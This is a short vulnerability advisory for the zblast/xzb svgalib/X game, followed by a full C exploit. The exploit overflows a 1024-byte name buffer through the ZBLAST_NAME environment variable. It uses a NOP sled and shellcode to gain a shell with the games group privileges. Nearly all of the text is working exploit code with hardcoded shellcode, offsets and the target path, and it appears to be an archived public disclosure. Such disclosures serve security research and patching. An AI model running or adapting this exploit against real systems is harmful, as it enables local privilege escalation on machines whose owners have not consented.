source: http://www.securityfocus.com/bid/7836/info

A vulnerability has been reported for zblast, an svgalib-based game. The problem occurs when copying data from a user-supplied environment variable into a static memory buffer. By storing excessive data within the variable, it may be possible for an attacker to corrupt process memory, ultimately resulting in the execution of arbitrary code.

/* (linux)zblast/xzb[v1.2]: local buffer overflow.
   by: v9[v9@fakehalo.deadpig.org].

   zblast/xzb is a common svgalib/X game, included on
   www.svgalib.org's program downloads:
    http://www.svgalib.org/rus/zblast/index.html

   this exploit gives uid=20(games), using the X version
   of zblast.  both versions are based of the same code,
   except for the fact privileges are only dropped in the
   svgalib version:
    zblast.c:2095:#ifndef USE_X
    zblast.c:2096:setuid(getuid()); setgid(getgid());

   now for the point/fun of this.  you have to make it to
   the high scores in the game to exploit this :), as it's
   done when writing the high scores.  although, if there
   is a blank spot in the high scores you can just make
   it happen by typing <enter>, then <esc>.

   file stats(from install):
    -r-xr-sr-x root games /usr/local/games/xzb
    -r-sr-sr-x root games /usr/local/games/zblast

   the bug itself(simple enough):
    hiscore.c:124:void writescore(int score)
    hiscore.c:129:char name[1024],*ptr;
    hiscore.c:133:if((ptr=getenv("ZBLAST_NAME"))==NULL)
    hiscore.c:136:if((ptr=getenv("USER"))==NULL)
    hiscore.c:137:if((ptr=getenv("LOGNAME"))==NULL)
    hiscore.c:148:if(ptr!=NULL) strcpy(name,ptr);
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PATH "/usr/local/games/xzb" /* X binary.     */
#define DEFAULT_OFFSET 500 /* for typical small env. */

static char exec[]=
 "\x31\xdb\x31\xc9\xb3\x14\xb1\x14\x31\xc0\xb0\x47\xcd"
 "\x80\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56"
 "\x07\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34"
 "\x12\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80"
 "\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x01";

long esp(void){__asm__("movl %esp,%eax");}

int main(int argc,char **argv){
 char buf[1040];
 int i,offset;
 long ret;

 printf("(*)zblast/xzb[v1.2]: local buffer overflow.\n");
 printf("(*)by: v9@fakehalo.deadpig.org / fakehalo.\n");

 if(argc>1){offset=atoi(argv[1]);}
 else{offset=DEFAULT_OFFSET;}
 ret=(esp()-offset);

 printf("return address: 0x%lx, offset: %d.\n",ret,offset);
 /* alignment will never need to be changed. */
 for(i=0;i<sizeof(buf);i+=4){*(long *)&buf[i]=ret;}
 for(i=0;i<(1000-strlen(exec));i++){*(buf+i)=0x90;}
 memcpy(buf+i,exec,strlen(exec));
 setenv("ZBLAST_NAME",buf,1); /* or $USER/$LOGNAME. */
 if(execlp(PATH,PATH,0))
  printf("* failed to execute %s.\n",PATH);
 exit(0);
}